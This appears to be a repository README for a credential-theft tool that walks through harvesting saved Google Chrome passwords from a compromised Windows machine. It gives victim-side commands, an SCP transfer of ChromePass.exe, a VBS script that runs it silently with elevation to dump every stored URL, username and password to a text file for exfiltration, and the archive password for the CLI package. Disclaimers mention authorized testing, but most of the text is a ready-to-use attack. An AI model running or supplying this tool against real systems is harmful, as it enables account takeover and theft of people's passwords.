# 🕵️‍♂️ ChromePass-Harvester

**Harvest saved Google Chrome passwords silently using ChromePass.exe (Post-Exploitation CLI Tool)**  

---

## 📖 Description

This repository contains a **VBS script** that automates the harvesting of saved Google Chrome passwords from a Windows system using [ChromePass](https://www.nirsoft.net/password_recovery_tools.html).  

It is mainly used in **post-exploitation scenarios**, where you already have access to a target system (usually via CLI), and want to **quickly extract all stored Chrome passwords**:

- Runs **ChromePass silently** without GUI.  
- Extracts **all saved passwords automatically**.  
- Saves output to a **TXT file** in a specified folder.  
- Requests **admin privileges** for proper execution.  

> ⚠ **Disclaimer:** Only use this script for **authorized penetration testing or educational labs**. Using it on unauthorized systems is illegal.  

---

## 🔑 Key Features

- 🌟 Fully CLI-based, ideal for post-exploitation environments.
- 🤫 Silent execution — no GUI pop-ups.
- 🔐 Requires admin privileges to extract all credentials.
- 📄 Saves output to a plain text file for easy exfiltration.

---

## 🛠️ Workflow (Post-Exploitation Scenario)

### 1️⃣ Gain access to the target

You already have **remote access** (e.g., via SSH, RDP, Meterpreter, etc.):

```
victim> whoami
victim> hostname
```

### 2️⃣ Transfer ChromePass CLI to the target

1. Download the **command-line version of ChromePass** from NirSoft:  
   [Download CLI tools package](https://www.nirsoft.net/password_recovery_tools.html)  

   > ⚠ Note: NirSoft removed command-line export from major tools. You need the **special CLI package**:  
   - Username: `download`  
   - Password: `nirsoft123!`  
   - Extract using password: `nirsoft123!`  

2. Transfer ChromePass.exe to the target using **SCP** (example):

```bash
attacker> scp D:\Tools\ChromePass.exe victim@192.168.1.100:C:\Temp\
```
Check on the victim machine:
```
victim> dir C:\Temp
ChromePass.exe
```

### 3️⃣ Create the VBS script on the target

Open Notepad on the victim system:
```
victim> notepad C:\Temp\run_chromepass.vbs
```
Paste the following script:
```vbs
Option Explicit

Dim fso, shellApp, exePath, outputFolder, outputFile, args

' --- Full paths ---
exePath = "C:\Path\to\passreccommandline\ChromePass.exe"
outputFolder = "C:\path\to\temp"
outputFile = outputFolder & "\ChromePasswords.txt"

Set fso = CreateObject("Scripting.FileSystemObject")

' --- Create output folder if it doesn't exist ---
If Not fso.FolderExists(outputFolder) Then
    fso.CreateFolder(outputFolder)
End If

args = "/stext """ & outputFile & """ /all /savesilent"

Set shellApp = CreateObject("Shell.Application")
shellApp.ShellExecute exePath, args, "", "runas", 1
```

Save the file as run_chromepass.vbs.

### 4️⃣ Execute the VBS script (Elevated Privileges)

Run the script from victim shell:
```
victim> cscript C:\Temp\run_chromepass.vbs
```

The script will prompt for admin privileges.

ChromePass runs silently, harvesting all saved Chrome passwords.

Output is saved as:
```
C:\path\to\ChromePasswords.txt
```
### 5️⃣ Verify harvested passwords
```
victim> type C:\Path\to\ChromePasswords.txt
```

You should see a list of saved Chrome URLs, usernames, and passwords.

---

⚠ Disclaimer

This tool is strictly for authorized use:

- Only run on systems you own or have explicit permission to test.
- Unauthorized use is illegal and may result in criminal charges.
- By using this script, you assume full responsibility for its actions.
